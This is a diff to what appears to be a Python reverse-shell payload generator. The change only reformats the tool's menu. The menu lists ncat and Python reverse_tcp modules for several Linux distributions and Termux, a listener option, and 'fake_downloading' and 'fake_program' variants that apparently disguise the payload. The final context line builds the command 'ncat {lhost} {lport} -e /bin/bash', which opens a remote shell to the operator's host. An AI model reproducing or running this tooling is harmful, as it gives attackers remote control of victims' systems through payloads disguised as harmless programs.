@@ -38,32 +38,31 @@ print("PAYLOAD PATH ==> ",output)
 print("")
 print("""\033[1;34m 
 *Most effective independent payload for all linux distros...
-
-[A] linux/reverse_tcp/reverse-shell
+____________________________________
+[A] linux/reverse_tcp/reverse-shell 
+____________________________________
 
 Available ncat payload modules>>>
- 
-[1] linux_debian/reverse_tcp
-[2] linux_arch/reverse_tcp
-[3] linux_fedora/reverse_tcp
-[4] linux_redhat/reverse_tcp
-[5] linux_termux/reverse_tcp
-[6] python/linux_debian/reverse_tcp
-[7] python/linux_arch/reverse_tcp
-[8] python/linux_fedora/reverse_tcp
-[9] python/linux_redhat/reverse_tcp
-[10] python/linux_termux/reverse_tcp
-
+ [1] linux_debian/reverse_tcp
+ [2] linux_arch/reverse_tcp
+ [3] linux_fedora/reverse_tcp
+ [4] linux_redhat/reverse_tcp
+ [5] linux_termux/reverse_tcp
+ [6] python/linux_debian/reverse_tcp
+ [7] python/linux_arch/reverse_tcp
+ [8] python/linux_fedora/reverse_tcp
+ [9] python/linux_redhat/reverse_tcp
+ [10] python/linux_termux/reverse_tcp
+____________________
 [L] febrev-listener
-
+--------------------
 Advanced ncat payload modules>>>>
-
-[11] linux_debian/fake_downloading/reverse_tcp
-[12] linux_arch/fake_downloading/reverse_tcp
-[13] linux_termux/fake_downloading/reverse_tcp
-[14] linux_debian/fake_program/reverse_tcp
-[15] linux_arch/fake_program/reverse_tcp
-[16] linux_termux/fake_program/reverse_tcp
+ [11] linux_debian/fake_downloading/reverse_tcp
+ [12] linux_arch/fake_downloading/reverse_tcp
+ [13] linux_termux/fake_downloading/reverse_tcp
+ [14] linux_debian/fake_program/reverse_tcp
+ [15] linux_arch/fake_program/reverse_tcp
+ [16] linux_termux/fake_program/reverse_tcp
 
 """)
 s=f"ncat {lhost} {lport} -e /bin/bash"
